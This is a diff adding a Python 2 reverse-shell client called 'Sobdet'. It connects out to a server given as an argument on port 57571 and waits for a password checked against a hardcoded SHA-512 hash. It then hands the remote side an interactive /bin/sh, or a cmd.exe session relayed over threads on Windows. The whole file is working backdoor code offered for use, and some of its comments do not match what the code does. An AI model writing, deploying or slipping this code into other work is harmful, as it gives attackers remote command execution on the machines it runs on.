@@ -1,0 +1,75 @@
+#!/usr/bin/python2
+
+import os, socket, subprocess, threading, sys;
+from hashlib import sha512 as s5
+
+def successful():
+    print "[*] Sobdet client connected to %s" % server
+
+def unsuccessful():
+    print "[!] Unable to connect to port %s on remote server!" % port
+
+
+# Linux shell
+def linux():
+    
+   successful()
+   os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+   p=subprocess.call(["/bin/sh", "-i"])
+
+# Windows shell
+def win():
+   successful()
+   p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, 
+                          stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+   s2p_thread = threading.Thread(target=s2p, args=[s, p])
+   s2p_thread.daemon = True
+   s2p_thread.start()
+   p2s_thread = threading.Thread(target=p2s, args=[s, p])
+   p2s_thread.daemon = True
+   p2s_thread.start()
+   p.wait()
+
+# General
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+
+# OS verification
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+# Defines remote host details as variables
+server= str(sys.argv[1]); port=57571;system='linux'
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+# Checks to see if port on remote host is open.
+# If you ever need to see what error is in the output, add 'z' into the 
+# sys.exit line above. 'z' is defined as the error output variable.
+try:
+    s.connect((server,port))
+    while True:
+        s.send("> ")
+        data = s.recv(1024).strip()
+        print(repr(data))
+        if s5(data).hexdigest() == '6401ce32f4365a06c661424e1c9159a38527c2dfef69f2f5a3c00685bac9eda66dd8e4674729c8677017115e1fd91b8e0c7f1d190987663c2be4e2f03a4642ab':
+            break
+except Exception as erroroutput:
+    z = erroroutput
+    unsuccessful()    
+    sys.exit()    
+
+
+try:
+    if not system:
+        system = 'linux'
+    else:
+        if 'w' in system:
+            win()
+        else:
+            linux()
+
+except KeyboardInterrupt:
+    s.close()
